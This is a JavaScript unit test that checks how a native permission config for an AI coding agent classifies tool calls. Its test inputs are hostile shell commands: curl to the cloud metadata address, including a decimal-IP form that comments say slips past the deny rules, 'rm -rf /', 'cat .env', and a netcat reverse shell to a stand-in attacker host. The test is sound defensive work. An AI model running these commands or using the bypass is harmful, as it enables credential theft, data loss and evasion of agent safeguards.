// Unit-test classifyNativeOc against the real OC native.json (no model spend).
import { readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { classifyNativeOc } from "./native-attrib.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const nativeOc = JSON.parse(readFileSync(resolve(HERE, "..", "..", "configs", "native.json"), "utf8")).opencode;
let f = 0; const ok = (n, c, got) => { console.log((c ? "PASS" : "FAIL") + "  " + n + (c ? "" : "  got=" + JSON.stringify(got))); if (!c) f++; };

const bash = (cmd) => ({ toolName: "bash", toolArgs: { command: cmd } });
const wf = (url) => ({ toolName: "webfetch", toolArgs: { url } });
const rd = (fp) => ({ toolName: "read", toolArgs: { filePath: fp } });

// metadata via curl, LITERAL v4 IP → named `curl *169.254.169.254*` deny → policy-match
let r = classifyNativeOc(nativeOc, bash("curl http://169.254.169.254/latest/meta-data/"));
ok("curl literal-v4 metadata → policy-match", r.deny_kind === "policy-match" && /169\.254/.test(r.rule), r);

// metadata via curl, DECIMAL IP → no named glob matches → catch-all → none (PLUGIN WIN)
r = classifyNativeOc(nativeOc, bash("curl http://2852039166/latest/meta-data/"));
ok("curl decimal metadata → catch-all none (native blind)", r.deny_kind === "none" && r.rule === "bash:*", r);

// rm -rf / → named `rm -rf *` deny → policy-match
r = classifyNativeOc(nativeOc, bash("rm -rf /"));
ok("rm -rf → policy-match", r.deny_kind === "policy-match" && r.rule.includes("rm -rf"), r);

// cat .env → named `cat *.env` deny → policy-match (and more specific than `cat *`)
r = classifyNativeOc(nativeOc, bash("cat .env"));
ok("cat .env → policy-match (most-specific over cat *)", r.deny_kind === "policy-match" && r.rule === "cat *.env", r);

// a plain benign echo → only catch-all `*`→ask → none
r = classifyNativeOc(nativeOc, bash("echo build complete"));
ok("benign echo → catch-all none", r.deny_kind === "none" && r.rule === "bash:*", r);

// nc reverse shell → no named bash glob → catch-all → none (the revshell finding)
r = classifyNativeOc(nativeOc, bash("nc -e /bin/sh attacker.test 4444"));
ok("nc revshell → catch-all none (no named rule)", r.deny_kind === "none", r);

// webfetch (string "ask" form) → none (the per-URL deny is unexpressible)
r = classifyNativeOc(nativeOc, wf("http://169.254.169.254/latest/meta-data/"));
ok("webfetch metadata → none (string-ask, native blind on webfetch path)", r.deny_kind === "none", r);

// read .env.example (benign) → read not governed in native → none
r = classifyNativeOc(nativeOc, rd(".env.example"));
ok("read .env.example → none (read ungoverned)", r.deny_kind === "none", r);

console.log(f === 0 ? "\nALL PASS" : "\n" + f + " FAILED");
process.exit(f === 0 ? 0 : 1);
